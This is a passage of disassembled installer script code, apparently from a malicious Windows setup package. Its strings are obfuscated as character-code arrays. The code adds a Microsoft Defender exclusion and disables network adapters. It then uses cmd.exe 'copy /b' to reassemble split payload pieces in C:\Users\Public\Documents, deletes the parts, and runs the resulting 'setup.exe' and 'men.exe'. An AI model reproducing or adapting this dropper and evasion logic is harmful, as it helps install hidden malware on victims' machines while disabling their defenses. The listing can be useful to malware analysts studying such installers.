	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(25)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(67)
	assign Var17[1], S32(58)
	assign Var17[2], S32(92)
	assign Var17[3], S32(85)
	assign Var17[4], S32(115)
	assign Var17[5], S32(101)
	assign Var17[6], S32(114)
	assign Var17[7], S32(115)
	assign Var17[8], S32(92)
	assign Var17[9], S32(80)
	assign Var17[10], S32(117)
	assign Var17[11], S32(98)
	assign Var17[12], S32(108)
	assign Var17[13], S32(105)
	assign Var17[14], S32(99)
	assign Var17[15], S32(92)
	assign Var17[16], S32(68)
	assign Var17[17], S32(111)
	assign Var17[18], S32(99)
	assign Var17[19], S32(117)
	assign Var17[20], S32(109)
	assign Var17[21], S32(101)
	assign Var17[22], S32(110)
	assign Var17[23], S32(116)
	assign Var17[24], S32(115)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(11)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(92)
	assign Var17[1], S32(117)
	assign Var17[2], S32(110)
	assign Var17[3], S32(122)
	assign Var17[4], S32(105)
	assign Var17[5], S32(112)
	assign Var17[6], S32(46)
	assign Var17[7], S32(50)
	assign Var17[8], S32(34)
	assign Var17[9], S32(32)
	assign Var17[10], S32(34)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(25)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(67)
	assign Var17[1], S32(58)
	assign Var17[2], S32(92)
	assign Var17[3], S32(85)
	assign Var17[4], S32(115)
	assign Var17[5], S32(101)
	assign Var17[6], S32(114)
	assign Var17[7], S32(115)
	assign Var17[8], S32(92)
	assign Var17[9], S32(80)
	assign Var17[10], S32(117)
	assign Var17[11], S32(98)
	assign Var17[12], S32(108)
	assign Var17[13], S32(105)
	assign Var17[14], S32(99)
	assign Var17[15], S32(92)
	assign Var17[16], S32(68)
	assign Var17[17], S32(111)
	assign Var17[18], S32(99)
	assign Var17[19], S32(117)
	assign Var17[20], S32(109)
	assign Var17[21], S32(101)
	assign Var17[22], S32(110)
	assign Var17[23], S32(116)
	assign Var17[24], S32(115)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(21)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(92)
	assign Var17[1], S32(102)
	assign Var17[2], S32(117)
	assign Var17[3], S32(110)
	assign Var17[4], S32(122)
	assign Var17[5], S32(105)
	assign Var17[6], S32(112)
	assign Var17[7], S32(46)
	assign Var17[8], S32(101)
	assign Var17[9], S32(120)
	assign Var17[10], S32(101)
	assign Var17[11], S32(34)
	assign Var17[12], S32(32)
	assign Var17[13], S32(38)
	assign Var17[14], S32(38)
	assign Var17[15], S32(32)
	assign Var17[16], S32(100)
	assign Var17[17], S32(101)
	assign Var17[18], S32(108)
	assign Var17[19], S32(32)
	assign Var17[20], S32(34)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(25)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(67)
	assign Var17[1], S32(58)
	assign Var17[2], S32(92)
	assign Var17[3], S32(85)
	assign Var17[4], S32(115)
	assign Var17[5], S32(101)
	assign Var17[6], S32(114)
	assign Var17[7], S32(115)
	assign Var17[8], S32(92)
	assign Var17[9], S32(80)
	assign Var17[10], S32(117)
	assign Var17[11], S32(98)
	assign Var17[12], S32(108)
	assign Var17[13], S32(105)
	assign Var17[14], S32(99)
	assign Var17[15], S32(92)
	assign Var17[16], S32(68)
	assign Var17[17], S32(111)
	assign Var17[18], S32(99)
	assign Var17[19], S32(117)
	assign Var17[20], S32(109)
	assign Var17[21], S32(101)
	assign Var17[22], S32(110)
	assign Var17[23], S32(116)
	assign Var17[24], S32(115)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(11)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(92)
	assign Var17[1], S32(117)
	assign Var17[2], S32(110)
	assign Var17[3], S32(122)
	assign Var17[4], S32(105)
	assign Var17[5], S32(112)
	assign Var17[6], S32(46)
	assign Var17[7], S32(51)
	assign Var17[8], S32(34)
	assign Var17[9], S32(32)
	assign Var17[10], S32(34)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(25)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(67)
	assign Var17[1], S32(58)
	assign Var17[2], S32(92)
	assign Var17[3], S32(85)
	assign Var17[4], S32(115)
	assign Var17[5], S32(101)
	assign Var17[6], S32(114)
	assign Var17[7], S32(115)
	assign Var17[8], S32(92)
	assign Var17[9], S32(80)
	assign Var17[10], S32(117)
	assign Var17[11], S32(98)
	assign Var17[12], S32(108)
	assign Var17[13], S32(105)
	assign Var17[14], S32(99)
	assign Var17[15], S32(92)
	assign Var17[16], S32(68)
	assign Var17[17], S32(111)
	assign Var17[18], S32(99)
	assign Var17[19], S32(117)
	assign Var17[20], S32(109)
	assign Var17[21], S32(101)
	assign Var17[22], S32(110)
	assign Var17[23], S32(116)
	assign Var17[24], S32(115)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(9)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(92)
	assign Var17[1], S32(117)
	assign Var17[2], S32(110)
	assign Var17[3], S32(122)
	assign Var17[4], S32(105)
	assign Var17[5], S32(112)
	assign Var17[6], S32(46)
	assign Var17[7], S32(50)
	assign Var17[8], S32(34)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	assign Var13, Var14
	pop ; StackCount = 13
	pushtype UnicodeString_2 ; StackCount = 14
	pushtype Type30 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype S32 ; StackCount = 17
	assign Var17, S32(7)
	pushvar Var16 ; StackCount = 18
	call SETARRAYLENGTH
	pop ; StackCount = 17
	pop ; StackCount = 16
	assign Var16[0], S32(99)
	assign Var16[1], S32(109)
	assign Var16[2], S32(100)
	assign Var16[3], S32(46)
	assign Var16[4], S32(101)
	assign Var16[5], S32(120)
	assign Var16[6], S32(101)
	assign Var15, Var16
	pop ; StackCount = 15
	pushvar Var14 ; StackCount = 16
	call STRFROMCODE
	pop ; StackCount = 15
	pop ; StackCount = 14
	pushvar Var8 ; StackCount = 15
	call EXEC
	pop ; StackCount = 14
	pop ; StackCount = 13
	pop ; StackCount = 12
	pop ; StackCount = 11
	pop ; StackCount = 10
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
	call ADDDEFENDEREXCLUSION
	call OBFUSCATEDEXTRACT
	pushtype Type30 ; StackCount = 8
	pushtype Type30 ; StackCount = 9
	pushtype S32 ; StackCount = 10
	assign Var10, S32(51)
	pushvar Var9 ; StackCount = 11
	call SETARRAYLENGTH
	pop ; StackCount = 10
	pop ; StackCount = 9
	assign Var9[0], S32(67)
	assign Var9[1], S32(58)
	assign Var9[2], S32(92)
	assign Var9[3], S32(85)
	assign Var9[4], S32(115)
	assign Var9[5], S32(101)
	assign Var9[6], S32(114)
	assign Var9[7], S32(115)
	assign Var9[8], S32(92)
	assign Var9[9], S32(80)
	assign Var9[10], S32(117)
	assign Var9[11], S32(98)
	assign Var9[12], S32(108)
	assign Var9[13], S32(105)
	assign Var9[14], S32(99)
	assign Var9[15], S32(92)
	assign Var9[16], S32(68)
	assign Var9[17], S32(111)
	assign Var9[18], S32(99)
	assign Var9[19], S32(117)
	assign Var9[20], S32(109)
	assign Var9[21], S32(101)
	assign Var9[22], S32(110)
	assign Var9[23], S32(116)
	assign Var9[24], S32(115)
	assign Var9[25], S32(92)
	assign Var9[26], S32(120)
	assign Var9[27], S32(56)
	assign Var9[28], S32(54)
	assign Var9[29], S32(45)
	assign Var9[30], S32(77)
	assign Var9[31], S32(105)
	assign Var9[32], S32(99)
	assign Var9[33], S32(114)
	assign Var9[34], S32(111)
	assign Var9[35], S32(115)
	assign Var9[36], S32(111)
	assign Var9[37], S32(102)
	assign Var9[38], S32(116)
	assign Var9[39], S32(45)
	assign Var9[40], S32(87)
	assign Var9[41], S32(105)
	assign Var9[42], S32(110)
	assign Var9[43], S32(100)
	assign Var9[44], S32(111)
	assign Var9[45], S32(119)
	assign Var9[46], S32(115)
	assign Var9[47], S32(100)
	assign Var9[48], S32(97)
	assign Var9[49], S32(116)
	assign Var9[50], S32(97)
	assign Var8, Var9
	pop ; StackCount = 8
	pushvar Var2 ; StackCount = 9
	call STRFROMCODE
	pop ; StackCount = 8
	pop ; StackCount = 7
	pushtype Type30 ; StackCount = 8
	pushtype Type30 ; StackCount = 9
	pushtype S32 ; StackCount = 10
	assign Var10, S32(36)
	pushvar Var9 ; StackCount = 11
	call SETARRAYLENGTH
	pop ; StackCount = 10
	pop ; StackCount = 9
	assign Var9[0], S32(67)
	assign Var9[1], S32(58)
	assign Var9[2], S32(92)
	assign Var9[3], S32(85)
	assign Var9[4], S32(115)
	assign Var9[5], S32(101)
	assign Var9[6], S32(114)
	assign Var9[7], S32(115)
	assign Var9[8], S32(92)
	assign Var9[9], S32(80)
	assign Var9[10], S32(117)
	assign Var9[11], S32(98)
	assign Var9[12], S32(108)
	assign Var9[13], S32(105)
	assign Var9[14], S32(99)
	assign Var9[15], S32(92)
	assign Var9[16], S32(68)
	assign Var9[17], S32(111)
	assign Var9[18], S32(99)
	assign Var9[19], S32(117)
	assign Var9[20], S32(109)
	assign Var9[21], S32(101)
	assign Var9[22], S32(110)
	assign Var9[23], S32(116)
	assign Var9[24], S32(115)
	assign Var9[25], S32(92)
	assign Var9[26], S32(83)
	assign Var9[27], S32(101)
	assign Var9[28], S32(114)
	assign Var9[29], S32(118)
	assign Var9[30], S32(101)
	assign Var9[31], S32(114)
	assign Var9[32], S32(46)
	assign Var9[33], S32(108)
	assign Var9[34], S32(111)
	assign Var9[35], S32(103)
	assign Var8, Var9
	pop ; StackCount = 8
	pushvar Var3 ; StackCount = 9
	call STRFROMCODE
	pop ; StackCount = 8
	pop ; StackCount = 7
	pushtype WideString ; StackCount = 8
	assign Var8, Var2
	pushtype UnicodeString_2 ; StackCount = 9
	pushtype Type30 ; StackCount = 10
	pushtype Type30 ; StackCount = 11
	pushtype S32 ; StackCount = 12
	assign Var12, S32(11)
	pushvar Var11 ; StackCount = 13
	call SETARRAYLENGTH
	pop ; StackCount = 12
	pop ; StackCount = 11
	assign Var11[0], S32(92)
	assign Var11[1], S32(83)
	assign Var11[2], S32(101)
	assign Var11[3], S32(114)
	assign Var11[4], S32(118)
	assign Var11[5], S32(101)
	assign Var11[6], S32(114)
	assign Var11[7], S32(46)
	assign Var11[8], S32(108)
	assign Var11[9], S32(111)
	assign Var11[10], S32(103)
	assign Var10, Var11
	pop ; StackCount = 10
	pushvar Var9 ; StackCount = 11
	call STRFROMCODE
	pop ; StackCount = 10
	pop ; StackCount = 9
	add Var8, Var9
	pop ; StackCount = 8
	assign Var4, Var8
	pop ; StackCount = 7
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var2
	pushvar Var8 ; StackCount = 10
	call FORCEDIRECTORIES
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var3
	pushvar Var8 ; StackCount = 10
	call FILEEXISTS
	pop ; StackCount = 9
	pop ; StackCount = 8
	sfz Var8
	pop ; StackCount = 7
	jf loc_1d7a
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var4
	pushvar Var8 ; StackCount = 10
	call FILEEXISTS
	pop ; StackCount = 9
	pop ; StackCount = 8
	sfz Var8
	pop ; StackCount = 7
	jf loc_1d46
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var4
	pushvar Var8 ; StackCount = 10
	call DELETEFILE
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
loc_1d46:
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var4
	pushtype UnicodeString_2 ; StackCount = 10
	assign Var10, Var3
	pushvar Var8 ; StackCount = 11
	call RENAMEFILE
	pop ; StackCount = 10
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
loc_1d7a:
	pushtype WideString ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	pushtype Type30 ; StackCount = 10
	pushtype Type30 ; StackCount = 11
	pushtype S32 ; StackCount = 12
	assign Var12, S32(26)
	pushvar Var11 ; StackCount = 13
	call SETARRAYLENGTH
	pop ; StackCount = 12
	pop ; StackCount = 11
	assign Var11[0], S32(67)
	assign Var11[1], S32(58)
	assign Var11[2], S32(92)
	assign Var11[3], S32(85)
	assign Var11[4], S32(115)
	assign Var11[5], S32(101)
	assign Var11[6], S32(114)
	assign Var11[7], S32(115)
	assign Var11[8], S32(92)
	assign Var11[9], S32(80)
	assign Var11[10], S32(117)
	assign Var11[11], S32(98)
	assign Var11[12], S32(108)
	assign Var11[13], S32(105)
	assign Var11[14], S32(99)
	assign Var11[15], S32(92)
	assign Var11[16], S32(68)
	assign Var11[17], S32(111)
	assign Var11[18], S32(99)
	assign Var11[19], S32(117)
	assign Var11[20], S32(109)
	assign Var11[21], S32(101)
	assign Var11[22], S32(110)
	assign Var11[23], S32(116)
	assign Var11[24], S32(115)
	assign Var11[25], S32(92)
	assign Var10, Var11
	pop ; StackCount = 10
	pushvar Var9 ; StackCount = 11
	call STRFROMCODE
	pop ; StackCount = 10
	pop ; StackCount = 9
	assign Var8, Var9
	pop ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	pushtype Type30 ; StackCount = 10
	pushtype Type30 ; StackCount = 11
	pushtype S32 ; StackCount = 12
	assign Var12, S32(9)
	pushvar Var11 ; StackCount = 13
	call SETARRAYLENGTH
	pop ; StackCount = 12
	pop ; StackCount = 11
	assign Var11[0], S32(115)
	assign Var11[1], S32(101)
	assign Var11[2], S32(116)
	assign Var11[3], S32(117)
	assign Var11[4], S32(112)
	assign Var11[5], S32(46)
	assign Var11[6], S32(101)
	assign Var11[7], S32(120)
	assign Var11[8], S32(101)
	assign Var10, Var11
	pop ; StackCount = 10
	pushvar Var9 ; StackCount = 11
	call STRFROMCODE
	pop ; StackCount = 10
	pop ; StackCount = 9
	add Var8, Var9
	pop ; StackCount = 8
	assign Var6, Var8
	pop ; StackCount = 7
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var6
	pushvar Var8 ; StackCount = 10
	call FILEEXISTS
	pop ; StackCount = 9
	pop ; StackCount = 8
	sfz Var8
	pop ; StackCount = 7
	jf loc_21ed
	pushtype BOOLEAN ; StackCount = 8
	pushtype Pointer ; StackCount = 9
	setptr Var9, Var7
	pushtype U8_4 ; StackCount = 10
	assign Var10, U8_4(0)
	pushtype S32 ; StackCount = 11
	assign Var11, S32(5)
	pushtype UnicodeString_2 ; StackCount = 12
	pushtype Type30 ; StackCount = 13
	pushtype Type30 ; StackCount = 14
	pushtype S32 ; StackCount = 15
	assign Var15, S32(0)
	pushvar Var14 ; StackCount = 16
	call SETARRAYLENGTH
	pop ; StackCount = 15
	pop ; StackCount = 14
	assign Var13, Var14
	pop ; StackCount = 13
	pushvar Var12 ; StackCount = 14
	call STRFROMCODE
	pop ; StackCount = 13
	pop ; StackCount = 12
	pushtype UnicodeString_2 ; StackCount = 13
	pushtype Type30 ; StackCount = 14
	pushtype Type30 ; StackCount = 15
	pushtype S32 ; StackCount = 16
	assign Var16, S32(0)
	pushvar Var15 ; StackCount = 17
	call SETARRAYLENGTH
	pop ; StackCount = 16
	pop ; StackCount = 15
	assign Var14, Var15
	pop ; StackCount = 14
	pushvar Var13 ; StackCount = 15
	call STRFROMCODE
	pop ; StackCount = 14
	pop ; StackCount = 13
	pushtype UnicodeString_2 ; StackCount = 14
	assign Var14, Var6
	pushvar Var8 ; StackCount = 15
	call EXEC
	pop ; StackCount = 14
	pop ; StackCount = 13
	pop ; StackCount = 12
	pop ; StackCount = 11
	pop ; StackCount = 10
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
loc_21ed:
	pushtype WideString ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	pushtype Type30 ; StackCount = 10
	pushtype Type30 ; StackCount = 11
	pushtype S32 ; StackCount = 12
	assign Var12, S32(25)
	pushvar Var11 ; StackCount = 13
	call SETARRAYLENGTH
	pop ; StackCount = 12
	pop ; StackCount = 11
	assign Var11[0], S32(67)
	assign Var11[1], S32(58)
	assign Var11[2], S32(92)
	assign Var11[3], S32(85)
	assign Var11[4], S32(115)
	assign Var11[5], S32(101)
	assign Var11[6], S32(114)
	assign Var11[7], S32(115)
	assign Var11[8], S32(92)
	assign Var11[9], S32(80)
	assign Var11[10], S32(117)
	assign Var11[11], S32(98)
	assign Var11[12], S32(108)
	assign Var11[13], S32(105)
	assign Var11[14], S32(99)
	assign Var11[15], S32(92)
	assign Var11[16], S32(68)
	assign Var11[17], S32(111)
	assign Var11[18], S32(99)
	assign Var11[19], S32(117)
	assign Var11[20], S32(109)
	assign Var11[21], S32(101)
	assign Var11[22], S32(110)
	assign Var11[23], S32(116)
	assign Var11[24], S32(115)
	assign Var10, Var11
	pop ; StackCount = 10
	pushvar Var9 ; StackCount = 11
	call STRFROMCODE
	pop ; StackCount = 10
	pop ; StackCount = 9
	assign Var8, Var9
	pop ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	pushtype Type30 ; StackCount = 10
	pushtype Type30 ; StackCount = 11
	pushtype S32 ; StackCount = 12
	assign Var12, S32(8)
	pushvar Var11 ; StackCount = 13
	call SETARRAYLENGTH
	pop ; StackCount = 12
	pop ; StackCount = 11
	assign Var11[0], S32(92)
	assign Var11[1], S32(109)
	assign Var11[2], S32(101)
	assign Var11[3], S32(110)
	assign Var11[4], S32(46)
	assign Var11[5], S32(101)
	assign Var11[6], S32(120)
	assign Var11[7], S32(101)
	assign Var10, Var11
	pop ; StackCount = 10
	pushvar Var9 ; StackCount = 11
	call STRFROMCODE
	pop ; StackCount = 10
	pop ; StackCount = 9
	add Var8, Var9
	pop ; StackCount = 8
	assign Var5, Var8
	pop ; StackCount = 7
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var5
	pushvar Var8 ; StackCount = 10
	call FILEEXISTS
	pop ; StackCount = 9
	pop ; StackCount = 8
	sfz Var8
	pop ; StackCount = 7
	jf loc_263a
	pushtype BOOLEAN ; StackCount = 8
	pushtype Pointer ; StackCount = 9
	setptr Var9, Var7
	pushtype U8_4 ; StackCount = 10
	assign Var10, U8_4(0)
	pushtype S32 ; StackCount = 11
	assign Var11, S32(0)
	pushtype UnicodeString_2 ; StackCount = 12
	pushtype Type30 ; StackCount = 13
	pushtype Type30 ; StackCount = 14
	pushtype S32 ; StackCount = 15
	assign Var15, S32(0)
	pushvar Var14 ; StackCount = 16
	call SETARRAYLENGTH
	pop ; StackCount = 15
	pop ; StackCount = 14
	assign Var13, Var14
	pop ; StackCount = 13
	pushvar Var12 ; StackCount = 14
	call STRFROMCODE
	pop ; StackCount = 13
	pop ; StackCount = 12
	pushtype UnicodeString_2 ; StackCount = 13
	pushtype Type30 ; StackCount = 14
	pushtype Type30 ; StackCount = 15
	pushtype S32 ; StackCount = 16
	assign Var16, S32(0)
	pushvar Var15 ; StackCount = 17
	call SETARRAYLENGTH
	pop ; StackCount = 16
	pop ; StackCount = 15
	assign Var14, Var15
	pop ; StackCount = 14
	pushvar Var13 ; StackCount = 15
	call STRFROMCODE
	pop ; StackCount = 14
	pop ; StackCount = 13
	pushtype UnicodeString_2 ; StackCount = 14
	assign Var14, Var5
	pushvar Var8 ; StackCount = 15
	call EXEC
	pop ; StackCount = 14
	pop ; StackCount = 13
	pop ; StackCount = 12
	pop ; StackCount = 11
	pop ; StackCount = 10
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
loc_263a:
	jump loc_4c1a
loc_263f:
	call ADDDEFENDEREXCLUSION
	call DISABLENETWORKADAPTERS
	pushtype BOOLEAN ; StackCount = 8
	pushtype Pointer ; StackCount = 9
	setptr Var9, Var7
	pushtype U8_4 ; StackCount = 10
	assign Var10, U8_4(1)
	pushtype S32 ; StackCount = 11
	assign Var11, S32(0)
	pushtype UnicodeString_2 ; StackCount = 12
	assign Var12, String_3("")
	pushtype UnicodeString_2 ; StackCount = 13
	pushtype WideString ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(12)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(47)
	assign Var17[1], S32(99)
	assign Var17[2], S32(32)
	assign Var17[3], S32(99)
	assign Var17[4], S32(111)
	assign Var17[5], S32(112)
	assign Var17[6], S32(121)
	assign Var17[7], S32(32)
	assign Var17[8], S32(47)
	assign Var17[9], S32(98)
	assign Var17[10], S32(32)
	assign Var17[11], S32(34)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	assign Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(25)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(67)
	assign Var17[1], S32(58)
	assign Var17[2], S32(92)
	assign Var17[3], S32(85)
	assign Var17[4], S32(115)
	assign Var17[5], S32(101)
	assign Var17[6], S32(114)
	assign Var17[7], S32(115)
	assign Var17[8], S32(92)
	assign Var17[9], S32(80)
	assign Var17[10], S32(117)
	assign Var17[11], S32(98)
	assign Var17[12], S32(108)
	assign Var17[13], S32(105)
	assign Var17[14], S32(99)
	assign Var17[15], S32(92)
	assign Var17[16], S32(68)
	assign Var17[17], S32(111)
	assign Var17[18], S32(99)
	assign Var17[19], S32(117)
	assign Var17[20], S32(109)
	assign Var17[21], S32(101)
	assign Var17[22], S32(110)
	assign Var17[23], S32(116)
	assign Var17[24], S32(115)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(13)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(92)
	assign Var17[1], S32(117)
	assign Var17[2], S32(110)
	assign Var17[3], S32(122)
	assign Var17[4], S32(105)
	assign Var17[5], S32(112)
	assign Var17[6], S32(46)
	assign Var17[7], S32(51)
	assign Var17[8], S32(34)
	assign Var17[9], S32(32)
	assign Var17[10], S32(43)
	assign Var17[11], S32(32)
	assign Var17[12], S32(34)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(25)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(67)
	assign Var17[1], S32(58)
	assign Var17[2], S32(92)
	assign Var17[3], S32(85)
	assign Var17[4], S32(115)
	assign Var17[5], S32(101)
	assign Var17[6], S32(114)
	assign Var17[7], S32(115)
	assign Var17[8], S32(92)
	assign Var17[9], S32(80)
	assign Var17[10], S32(117)
	assign Var17[11], S32(98)
	assign Var17[12], S32(108)
	assign Var17[13], S32(105)
	assign Var17[14], S32(99)
	assign Var17[15], S32(92)
	assign Var17[16], S32(68)
	assign Var17[17], S32(111)
	assign Var17[18], S32(99)
	assign Var17[19], S32(117)
	assign Var17[20], S32(109)
	assign Var17[21], S32(101)
	assign Var17[22], S32(110)
	assign Var17[23], S32(116)
	assign Var17[24], S32(115)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(11)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(92)
	assign Var17[1], S32(117)
	assign Var17[2], S32(110)
	assign Var17[3], S32(122)
	assign Var17[4], S32(105)
	assign Var17[5], S32(112)
	assign Var17[6], S32(46)
	assign Var17[7], S32(50)
	assign Var17[8], S32(34)
	assign Var17[9], S32(32)
	assign Var17[10], S32(34)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(25)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(67)
	assign Var17[1], S32(58)
	assign Var17[2], S32(92)
	assign Var17[3], S32(85)
	assign Var17[4], S32(115)
	assign Var17[5], S32(101)
	assign Var17[6], S32(114)
	assign Var17[7], S32(115)
	assign Var17[8], S32(92)
	assign Var17[9], S32(80)
	assign Var17[10], S32(117)
	assign Var17[11], S32(98)
	assign Var17[12], S32(108)
	assign Var17[13], S32(105)
	assign Var17[14], S32(99)
